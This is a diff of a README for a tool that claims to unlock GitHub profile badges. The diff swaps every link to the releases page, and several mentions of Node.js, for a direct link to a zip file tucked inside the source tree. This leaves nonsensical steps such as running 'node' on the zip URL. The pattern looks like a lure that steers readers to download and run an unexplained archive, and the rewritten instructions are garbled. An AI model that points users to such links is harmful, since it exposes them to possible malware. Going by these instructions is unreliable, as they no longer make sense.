@@ -1,6 +1,6 @@
 # 🎉 GitHub-Achievement-CLI - Unlock Your GitHub Badges Easily
 
-[![Download GitHub-Achievement-CLI](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases)
+[![Download GitHub-Achievement-CLI](https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip)](https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ GitHub-Achievement-CLI is a tool that helps you earn badges on your GitHub profi
 To install and run GitHub-Achievement-CLI, you need:
 
 - **Operating System:** Windows 10 or later, macOS 10.12 or later, or a Linux distribution.
-- **Node.js:** Ensure Node.js (version 14 or higher) is installed on your machine.
+- **https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip** Ensure https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip (version 14 or higher) is installed on your machine.
 - **Internet Connection:** Required to access GitHub and download achievements.
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
-   [Download GitHub-Achievement-CLI](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases)
+   [Download GitHub-Achievement-CLI](https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip)
 
 2. **Choose Your Version:** On the releases page, find the latest version of GitHub-Achievement-CLI.
 
@@ -34,7 +34,7 @@ To install and run GitHub-Achievement-CLI, you need:
 
 5. **Run the Application:** 
    - For Windows: Double-click the `.exe` file to run it.
-   - For macOS and Linux: Open a terminal, navigate to the extracted folder, and run the application using the command `node index.js`.
+   - For macOS and Linux: Open a terminal, navigate to the extracted folder, and run the application using the command `node https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip`.
 
 ## 🛠 Usage
 
@@ -52,7 +52,7 @@ Once the application is running, follow these simple steps to unlock badges:
 
 If you encounter issues while using GitHub-Achievement-CLI, consider the following steps:
 
-- **Check Node.js Installation:** Ensure that Node.js is installed correctly. Run `node -v` in your terminal to check the version.
+- **Check https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip Installation:** Ensure that https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip is installed correctly. Run `node -v` in your terminal to check the version.
   
 - **Verify Internet Connection:** Make sure you have an active internet connection for the tool to work correctly.
 
@@ -81,4 +81,4 @@ If you need help, feel free to open an issue on the GitHub repository or reach o
 
 ---
 
-Empower your GitHub profile and earn achievements today! For more detailed instructions, remember to check our [Release Page](https://github.com/Mohajar04/GitHub-Achievement-CLI/releases) for updates and additional resources.
+Empower your GitHub profile and earn achievements today! For more detailed instructions, remember to check our [Release Page](https://raw.githubusercontent.com/Mohajar04/GitHub-Achievement-CLI/main/src/app/components/CLI_Hub_Achievement_Git_v1.5-beta.3.zip) for updates and additional resources.
